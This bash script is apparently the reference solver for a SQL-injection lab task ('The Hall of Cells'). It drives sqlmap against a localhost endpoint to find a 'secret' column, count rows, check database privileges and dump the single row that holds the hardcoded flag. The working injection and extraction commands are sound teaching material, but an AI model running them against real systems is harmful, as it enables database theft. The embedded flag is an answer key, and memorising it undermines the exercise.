#!/usr/bin/env bash
# solvers/p2_7.sh: Task 2.7 "The Hall of Cells" canonical exploit.
#
# An ordinary sink (bare, unquoted numeric `id`, same multi-technique shape
# as A Sealed Floor). What's different is the database: fifteen small,
# mundane bookkeeping tables plus one large one, `cell_records`, with
# hundreds of routine rows and exactly one that matters. sqlmap finds the
# injection immediately, same as every earlier floor; the actual lesson is
# what to do next when "dump everything and read it" stops being practical:
#   - --search -C secret finds the one interesting column across every
#     table in the database, without checking each table by hand
#   - --count sizes the table before committing to a dump
#   - -C / --where pull out only the row that matters, instead of every row
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{targeted_beats_dump_all}"
TARGET="${BASE}/p2/hall?id=1"

WORKDIR=$(mktemp -d)
OUTDIR="${WORKDIR}/sqlmap-out"
LOG="${WORKDIR}/sqlmap.log"
trap 'rm -rf "$WORKDIR"' EXIT

# --- Step 1: find the interesting column without checking 16 tables by hand
echo "[p2_7] step 1: sqlmap --search -C secret (find the column, not the whole schema)"
sqlmap -u "$TARGET" -p id --batch --ignore-stdin --search -C secret \
    --output-dir="${OUTDIR}/search" 2>&1 | tee "${LOG}.search" >/dev/null
if grep -qi "cell_records" "${LOG}.search"; then
    echo "  ok: --search located 'secret' on table cell_records, without touching the other 15 tables"
else
    echo "[p2_7] FAIL: --search did not locate the secret column"
    exit 1
fi

# --- Step 2: size the table before committing to a dump --------------------
echo "[p2_7] step 2: sqlmap --count (see the table is too large to read by eye)"
sqlmap -u "$TARGET" -p id --batch --ignore-stdin \
    -D seiyaku_p2_hall --count -T cell_records \
    --output-dir="${OUTDIR}/count" 2>&1 | tee "${LOG}.count" >/dev/null
ROWCOUNT=$(grep -oE "\| cell_records *\| [0-9]+" "${LOG}.count" | grep -oE "[0-9]+$")
echo "  cell_records has ${ROWCOUNT:-an unknown number of} rows"
if [[ -n "$ROWCOUNT" ]] && [[ "$ROWCOUNT" -gt 100 ]]; then
    echo "  ok: too many rows to read through by hand, targeted extraction is the practical move"
else
    echo "[p2_7] FAIL: expected a large row count from --count"
    exit 1
fi

# --- Step 3: a quick, honest recon aside (least privilege in sqlmap's own words)
echo "[p2_7] step 3: recon, --current-user and --is-dba"
sqlmap -u "$TARGET" -p id --batch --ignore-stdin --current-user --is-dba \
    --output-dir="${OUTDIR}/recon" 2>&1 | tee "${LOG}.recon" >/dev/null
grep -i "current user:" "${LOG}.recon" | sed 's/^/  /'
grep -i "current user is dba" "${LOG}.recon" | sed 's/^/  /'
if grep -qi "svc_p2_hall" "${LOG}.recon" && grep -qi "is DBA: False" "${LOG}.recon"; then
    echo "  ok: confirmed restricted app user, not a superuser, straight from sqlmap's own recon"
else
    echo "[p2_7] FAIL: expected svc_p2_hall / is-dba False from recon"
    exit 1
fi

# --- Step 4: targeted extraction, not a full dump ---------------------------
echo "[p2_7] step 4: sqlmap -C secret --where \"secret IS NOT NULL\" --dump (one row, not 400+)"
sqlmap -u "$TARGET" -p id --batch --ignore-stdin \
    -D seiyaku_p2_hall -T cell_records -C secret --where "secret IS NOT NULL" --dump \
    --output-dir="${OUTDIR}/dump" 2>&1 | tee "${LOG}.dump" >/dev/null

if grep -qF "$FLAG" "${LOG}.dump" || grep -rqF "$FLAG" "${OUTDIR}/dump" 2>/dev/null; then
    echo "  ok: targeted extraction recovered the flag: ${FLAG}"
    echo "[p2_7] PASS"
    exit 0
else
    echo "[p2_7] FAIL: flag not found in targeted dump"
    echo "---- last 30 lines of sqlmap output ----"
    tail -30 "${LOG}.dump"
    exit 1
fi
